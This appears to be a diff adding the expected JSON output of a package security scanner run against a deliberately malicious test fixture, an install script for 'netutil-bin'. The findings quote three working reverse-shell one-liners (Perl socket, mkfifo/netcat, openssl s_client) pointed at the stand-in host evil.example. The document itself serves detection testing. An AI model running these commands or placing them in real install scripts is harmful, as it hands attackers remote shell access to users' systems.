@@ -1,0 +1,107 @@
+{
+  "package_name": "netutil-bin",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "EXFIL-002",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "Netcat data transfer (install script)",
+      "description": "Using netcat to transfer data externally",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "line": 3,
+        "column": 47,
+        "snippet": "  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f"
+      },
+      "recommendation": "Netcat should not be piping data in build scripts",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "| nc "
+      }
+    },
+    {
+      "id": "SHELL-005",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Perl reverse shell (install script)",
+      "description": "A Perl socket reverse shell (Socket + connect/exec).",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "line": 2,
+        "column": 3,
+        "snippet": "  perl -e 'use Socket;$i=\"evil.example\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));exec(\"/bin/sh -i\");'"
+      },
+      "recommendation": "Do not build. This is a remote shell.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "perl -e 'use Socket;$i=\"evil.example\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));exec(\"/bin/sh"
+      }
+    },
+    {
+      "id": "SHELL-009",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "OpenSSL-encrypted reverse shell (install script)",
+      "description": "openssl s_client used as an encrypted C2 channel.",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "line": 4,
+        "column": 3,
+        "snippet": "  openssl s_client -quiet -connect evil.example:4443 | /bin/sh"
+      },
+      "recommendation": "Do not build. This is an encrypted remote shell.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "openssl s_client -quiet -connect"
+      }
+    },
+    {
+      "id": "SHELL-010",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Named-pipe (mkfifo) reverse shell (install script)",
+      "description": "mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "line": 3,
+        "column": 3,
+        "snippet": "  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f"
+      },
+      "recommendation": "Do not build. This is a remote shell.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "
+      }
+    },
+    {
+      "id": "CHK-005",
+      "severity": "high",
+      "category": "cryptography",
+      "title": "All non-VCS sources use SKIP checksum",
+      "description": "No integrity verification is performed on 1 non-VCS source(s)",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Provide real checksums for non-VCS sources",
+      "cwe_id": "CWE-354",
+      "metadata": {
+        "non_vcs_source_count": 1,
+        "vcs_source_count": 0
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
+    "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install"
+  ],
+  "timestamp": "2026-06-15T13:48:50.303171897Z",
+  "scan_duration_ms": 7
+}
